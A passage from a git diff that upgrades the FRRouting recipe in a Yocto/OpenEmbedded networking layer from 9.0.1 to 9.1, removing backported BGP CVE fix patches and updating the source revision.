-+		return BGP_ATTR_PARSE_WITHDRAW;
- 
- 	/* "An UPDATE message that contains the MP_UNREACH_NLRI is not required
- 	   to carry any other path attributes.", though if MP_REACH_NLRI or NLRI
-@@ -3889,7 +3892,13 @@ done:
- 	aspath_unintern(&as4_path);
- 
- 	transit = bgp_attr_get_transit(attr);
--	if (ret != BGP_ATTR_PARSE_ERROR) {
-+	/* If we received an UPDATE with mandatory attributes, then
-+	 * the unrecognized transitive optional attribute of that
-+	 * path MUST be passed. Otherwise, it's an error, and from
-+	 * security perspective it might be very harmful if we continue
-+	 * here with the unrecognized attributes.
-+	 */
-+	if (ret == BGP_ATTR_PARSE_PROCEED) {
- 		/* Finally intern unknown attribute. */
- 		if (transit)
- 			bgp_attr_set_transit(attr, transit_intern(transit));
--- 
-2.42.1
-
diff --git a/meta-networking/recipes-protocols/frr/frr_9.0.1.bb b/meta-networking/recipes-protocols/frr/frr_9.1.bb
similarity index 94%
rename from meta-networking/recipes-protocols/frr/frr_9.0.1.bb
rename to meta-networking/recipes-protocols/frr/frr_9.1.bb
index c447df051..9db6710d9 100644
--- a/meta-networking/recipes-protocols/frr/frr_9.0.1.bb
+++ b/meta-networking/recipes-protocols/frr/frr_9.1.bb
@@ -11,16 +11,11 @@ LIC_FILES_CHKSUM = "file://doc/licenses/GPL-2.0;md5=b234ee4d69f5fce4486a80fdaf4a
 
 PR = "r1"
 
-SRC_URI = "git://github.com/FRRouting/frr.git;protocol=https;branch=stable/9.0 \
+SRC_URI = "git://github.com/FRRouting/frr.git;protocol=https;branch=stable/9.1 \
            file://frr.pam \
-           file://0001-tools-make-quiet-actually-suppress-output.patch \
-           file://CVE-2023-46752.patch \
-           file://CVE-2023-46753.patch \
-           file://CVE-2023-47235.patch \
-           file://CVE-2023-47234.patch \
            "
 
-SRCREV = "31ed3dd753d62b5d8916998bc32814007e91364b"
+SRCREV = "312faf8008bb4f3b9e84b8e2758cd2cbdf5742b5"
 
 UPSTREAM_CHECK_GITTAGREGEX = "frr-(?P<pver>\d+(\.\d+)+)$"
 
-- 
2.34.1


